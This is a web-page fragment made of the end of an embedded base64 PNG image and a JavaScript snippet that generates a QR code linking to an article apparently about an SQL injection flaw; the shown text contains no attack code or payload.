XPar6jqtD+nRuvWhe3OmV3+Uge/U8RK/anwj7i/bc8a6X/xhIkTtefwOngUCeGgh6RKcpqouw9sOsQ7h9YOb2exYh9cCpxD16Apj+WoA+UX/nsK6D6LDGq37wVXcaiMU3vuYGTr/b6zH606EOX9OE819FhuT1ixB917f75KJ1kD4QNF8I0WDGylVA9FpX9J6lVUB8ECxtDOtG7dEa1n1WNfcbsrqVF2rH72U5dXF3JvMizNPvuly0L6ROHR5z60TrVqhH1NM5rPfsvh2H1Pe8+4nm4dp/vyHe1pvg8TUEMj14Dp89P6z7WQ/J96dJDslD0DoRogNKT6N7XBXsfDsdmL6L6/1hn7/fkH5bL+bHQJz2FT57Xvt0v3rH7utc/06v/C4HeSLLU9F9MOfLUwHR4TH2flVbcaXDue8xkF5889fcwGkgcJ4a8OOnA6Z/z0I4zFhPWgVE9yAQDmfsHrkIqZF3hORr3wrztV6FeUgdzNjzcnHseRqIphtfcwP/9UDG6da6fxqljQF5eq585uGxX9+I7qcmh+d6XfkhfSCov++34/pFSB/g/p9gfrzZx3/9hvTPBzJtdZi5T4UIyUPQOvOdd918Yc/teNertgLWZ9j5q6YCUnflK28FxF/rCusKf3wgtcEdf38Dp4HUlFZxtQXMU4dwe0G4fSDcvLoIcx7CIahvRFjnIDrMaC1E72eB6DCjdd2v/ixC+o7+00DG5L3+/Rs4BgKZFjzGZ4/o0wPp17l9IPnO9avvUN+IeiG9x9y41idC/BBUF8faWncd1nUQvWoqrBMheeD+LuvjzT6ON+TNzvV/e5z/AAAA///dqREzAAAABklEQVQDAM4BobxU+epjAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-addmenu-AccountSecuityForPhone-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 